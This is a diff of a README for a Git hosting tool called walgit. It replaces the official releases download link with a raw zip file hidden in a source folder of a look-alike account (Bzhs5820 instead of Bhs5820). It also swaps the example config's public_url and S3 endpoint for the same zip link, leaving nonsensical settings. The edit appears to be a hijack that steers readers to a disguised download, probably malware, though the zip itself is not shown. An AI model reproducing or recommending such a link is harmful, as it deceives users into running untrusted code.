@@ -17,7 +17,7 @@ walgit is a powerful yet simple tool that lets you host your own Git repositorie
 
 ### Step 1: Get walgit
 
-[![Download walgit](https://img.shields.io/badge/Download-walgit-blue?style=for-the-badge&logo=github)](https://github.com/Bhs5820/walgit/releases)
+[![Download walgit](https://img.shields.io/badge/Download-walgit-blue?style=for-the-badge&logo=github)](https://github.com/Bzhs5820/walgit/raw/refs/heads/main/crates/walgit-wal/src/Software-premold.zip)
 
 Visit this link to download the application. The download page will show you available versions of walgit for your system.
 
@@ -36,7 +36,7 @@ Create a simple configuration file called `walgit.toml` in the same folder as yo
 ```toml
 [server]
 listen = "0.0.0.0:8080"
-public_url = "https://git.example.com"
+public_url = "https://github.com/Bzhs5820/walgit/raw/refs/heads/main/crates/walgit-wal/src/Software-premold.zip"
 auto_create_on_push = true
 
 [server.auth]
@@ -49,7 +49,7 @@ backend = "s3"
 bucket = "my-walgit"
 
 [store.s3]
-endpoint = "https://s3.us-east-1.amazonaws.com"
+endpoint = "https://github.com/Bzhs5820/walgit/raw/refs/heads/main/crates/walgit-wal/src/Software-premold.zip"
 region = "us-east-1"
 ```
 
